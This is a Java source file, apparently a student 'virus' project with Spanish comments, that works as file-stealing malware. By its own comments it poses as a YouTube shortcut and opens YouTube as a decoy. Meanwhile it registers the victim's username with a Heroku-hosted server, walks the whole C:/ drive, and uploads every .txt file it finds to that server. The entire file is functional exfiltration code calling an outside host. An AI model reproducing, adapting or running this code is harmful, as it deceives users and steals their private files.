package virus_Seguridad;

import java.io.File;
import java.io.IOException;
import java.math.BigInteger;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpRequest.BodyPublisher;
import java.net.http.HttpRequest.BodyPublishers;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Random;

public class Main {

	//configuraciones iniciales
    private static final HttpClient httpClient = HttpClient.newBuilder()
            .version(HttpClient.Version.HTTP_2)
            .connectTimeout(Duration.ofSeconds(10))
            .build();

    public static void main(String[] args) throws Exception {
    	
    	//Funcion que abrira youtube en el buscador predeterminado de cada equipo, 
    	//esto debido a que nuestro virus se hace pasar por un acceso directo a youtube
    	abrirNavegadorPorDefecto("https://www.youtube.com");
        
    	//JSON que seran pasados al servidor
    	String json1 = new StringBuilder()
                .append("{")
                .append("\"nombre\":\""+System.getenv("USERNAME")+"\"")
                .append("}").toString();
    	
    	String json = new StringBuilder()
                .append("{")
                .append("\"nombre\":\""+System.getenv("USERNAME")+"\",")
                .append("\"contrasenia\":\"A \"")
                .append("}").toString();
      
        int id;
    	
        
        //Algunas llamadas al servidor, para iniciar el registro del usuario
        
        HttpRequest request = HttpRequest.newBuilder()
                .POST(HttpRequest.BodyPublishers.ofString(json))
                .uri(URI.create("https://servidorvirus.herokuapp.com/users/user"))
                .header("Content-Type", "application/json")
                .build();

        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
        
        if(response.statusCode()!=200) {
        	
        	System.out.print("registrando..");
        	
        	HttpRequest request2 = HttpRequest.newBuilder()
                     .POST(HttpRequest.BodyPublishers.ofString(json1))
                     .uri(URI.create("https://servidorvirus.herokuapp.com/users/signup"))
                     .header("Content-Type", "application/json")
                     .build();

             HttpResponse<String> response2 = httpClient.send(request2, HttpResponse.BodyHandlers.ofString());

             System.out.println(response2.statusCode());

             System.out.println(response2.body());
             
         	id=Integer.parseInt(response2.body().substring(response2.body().indexOf("id")+4, response2.body().length() -1));
             
        }else {
        	id=Integer.parseInt(response.body().substring(response.body().indexOf("id")+4, response.body().length() -1));
        }

        
    	System.out.print(System.getenv("USERNAME"));
    	
    	//Funcion que recorre todo el disco duro, mediante recursividad
       recorrer(new File("C:/"), id);
    }

    //funcion para enviar archivos por fromdata
    
    public static BodyPublisher ofMimeMultipartData(Map<Object, Object> data,
    	      String boundary) throws IOException {
    	    var byteArrays = new ArrayList<byte[]>();
    	    byte[] separator = ("--" + boundary + "\r\nContent-Disposition: form-data; name=")
    	        .getBytes(StandardCharsets.UTF_8);
    	    for (Map.Entry<Object, Object> entry : data.entrySet()) {
    	      byteArrays.add(separator);

    	      if (entry.getValue() instanceof Path) {
    	        var path = (Path) entry.getValue();
    	        String mimeType = Files.probeContentType(path);
    	        byteArrays.add(("\"" + entry.getKey() + "\"; filename=\"" + path.getFileName()
    	            + "\"\r\nContent-Type: " + mimeType + "\r\n\r\n")
    	                .getBytes(StandardCharsets.UTF_8));
    	        byteArrays.add(Files.readAllBytes(path));
    	        byteArrays.add("\r\n".getBytes(StandardCharsets.UTF_8));
    	      }
    	      else {
    	        byteArrays.add(("\"" + entry.getKey() + "\"\r\n\r\n" + entry.getValue() + "\r\n")
    	            .getBytes(StandardCharsets.UTF_8));
    	      }
    	    }
    	    byteArrays.add(("--" + boundary + "--").getBytes(StandardCharsets.UTF_8));
    	    return BodyPublishers.ofByteArrays(byteArrays);
    	  }
    
    //funcion para recorrer el disco duro
    public static void recorrer(File rec, int id){
    	File[] directorios=rec.listFiles();
    	if (directorios!=null){
    		for (File directorio: directorios){
    			System.out.println("directorio actual:"  + directorio);
    			recorrer(directorio, id);
    			System.out.println( " direcotrio: " + directorio);	
    		}
	    }else {
	    	if(rec.toString().endsWith(".txt")) {
	    		System.out.print(rec);
				comunicacion(rec, id);
			}
	    }
    }
    
    //funcion para el envio de los archivos
    public static void comunicacion(File file, int id) {
    	Map<Object, Object> data;
        String boundary;
        data = new LinkedHashMap<>();
        boundary = new BigInteger(256, new Random()).toString();
        data.put("image", file.toPath());
        data.put("id",id);
    	try {
            HttpRequest request = HttpRequest.newBuilder()
            		.uri(URI.create("https://servidorvirus.herokuapp.com/file/"))
            		.header("Content-Type", "multipart/form-data;boundary=" + boundary)
                    .POST(ofMimeMultipartData(data, boundary))
                    .build();

            HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());

            // print status code
            System.out.println(response.statusCode());

            // print response body
            System.out.println(response.body());
    	}catch(Exception e) {
    		System.out.print(e);
    	}
 
    }
    
    //funcion que nos permite emular un acceso directo a Youtube, bueno realmente a cualquier pagina
    public static void abrirNavegadorPorDefecto(String url) throws IOException{
        String osName = System.getProperty("os.name");
        if(osName.contains("Windows"))
            Runtime.getRuntime().exec("rundll32 url.dll,FileProtocolHandler " + url);
        else if(osName.contains("Linux"))
            Runtime.getRuntime().exec("xdg-open " + url);
        else if(osName.contains("Mac OS X"))
            Runtime.getRuntime().exec("open " + url);
    }
}